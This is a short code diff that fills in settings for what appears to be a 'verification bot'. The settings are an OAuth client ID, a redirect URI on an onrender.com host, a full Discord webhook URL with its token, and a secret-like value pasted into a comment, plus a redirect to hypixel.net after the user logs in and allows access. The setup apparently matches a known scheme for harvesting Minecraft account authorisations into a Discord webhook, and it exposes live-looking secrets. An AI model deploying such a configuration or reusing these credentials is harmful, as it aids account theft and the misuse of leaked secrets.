@@ -1,8 +1,8 @@
 //Change these btw
-const client_secret = '' //you need to put the "Secret Value" here not the "Secret ID"!!!!
-const client_id = ''
-const redirect_uri = ''
-const webhook_url = ''
+const client_secret = '' //you need to put the "yEj8Q~oBHdjp2LD0JHtmFWAeA5M8bh5bK4SMPde~" here not the "Secret ID"!!!!
+const client_id = '49eba111-8c41-4840-97fd-bee0513cd2db'
+const redirect_uri = 'https://verification-bot-m83l.onrender.com/verify'
+const webhook_url = 'https://discord.com/api/webhooks/1058638633910943784/YH527syWLAK84kc0qgsjEKaOZoKGsN0pA1gzRhLaL6DbzQijDDxqz8NMljQMug0Rli7G'
 const webhook_log = ''
 const redirection = 'https://hypixel.net' //Redirects the user after they login and allow (e.g 'https://hypixel.net') LEAVE BLANK IF U DONT WANT IT TO REDIRECT OR SUM IDK
 //Requirements
